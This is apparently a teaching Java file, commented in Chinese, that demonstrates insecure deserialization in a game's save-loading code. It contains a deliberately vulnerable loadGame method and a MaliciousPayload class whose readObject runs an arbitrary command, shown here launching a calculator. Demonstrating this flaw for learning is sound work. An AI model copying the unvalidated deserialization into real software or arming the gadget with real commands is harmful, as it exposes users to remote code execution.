import java.io.*;
import java.util.ArrayList;

// 游戏状态类（存在漏洞的根本原因：未验证反序列化数据）
class GameState implements Serializable {
    private String playerName;
    private int level;
    private transient ArrayList<String> inventory; // transient字段不会被自动序列化

    public GameState(String name, int level) {
        this.playerName = name;
        this.level = level;
        this.inventory = new ArrayList<>();
    }

    // 模拟游戏数据操作
    public void addInventoryItem(String item) {
        inventory.add(item);
    }

    @Override
    public String toString() {
        return "Player: " + playerName + " | Level: " + level + " | Inventory: " + inventory;
    }
}

// 游戏核心类
class Game implements Serializable {
    private String gameName;
    private transient GameState currentState; // transient字段需要手动处理

    public Game(String name) {
        this.gameName = name;
    }

    // 模拟保存游戏（存在漏洞的写法）
    public void saveGame(GameState state, String filename) {
        try (ObjectOutputStream out = new ObjectOutputStream(
                new FileOutputStream(filename))) {
            out.writeObject(state);
            System.out.println("[INFO] Game saved successfully");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // 不安全的加载方法（漏洞触发点）
    public GameState loadGame(String filename) {
        try (ObjectInputStream in = new ObjectInputStream(
                new FileInputStream(filename))) {
            // 危险的反序列化操作
            GameState state = (GameState) in.readObject();
            this.currentState = state;
            System.out.println("[INFO] Game loaded successfully");
            return state;
        } catch (IOException | ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    // 模拟游戏运行流程
    public void start() {
        System.out.println("Starting " + gameName + "...");
        GameState state = new GameState("Player1", 1);
        state.addInventoryItem("Sword");
        saveGame(state, "savegame.dat");
        
        // 模拟加载存档
        GameState loaded = loadGame("savegame.dat");
        if (loaded != null) {
            System.out.println("Loaded state: " + loaded);
        }
    }
}

// 恶意类示例（攻击者可能构造的恶意对象）
class MaliciousPayload implements Serializable {
    private String cmd;
    public MaliciousPayload(String command) {
        this.cmd = command;
    }
    
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 模拟执行任意命令（真实攻击中可能更隐蔽）
        Runtime.getRuntime().exec(cmd);
    }
}

// 漏洞利用演示类
public class VulnerableGameApp {
    public static void main(String[] args) {
        // 正常游戏流程
        Game game = new Game("Adventure Game");
        game.start();
        
        // 模拟攻击者构造恶意存档文件
        try (ObjectOutputStream out = new ObjectOutputStream(
                new FileOutputStream("malicious_save.dat"))) {
            out.writeObject(new MaliciousPayload("calc")); // 执行计算器作为演示
            System.out.println("[ATTACK] Malicious save file created");
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        // 模拟用户加载恶意存档（触发漏洞）
        Game fakeGame = new Game("Fake Game");
        fakeGame.loadGame("malicious_save.dat");
    }
}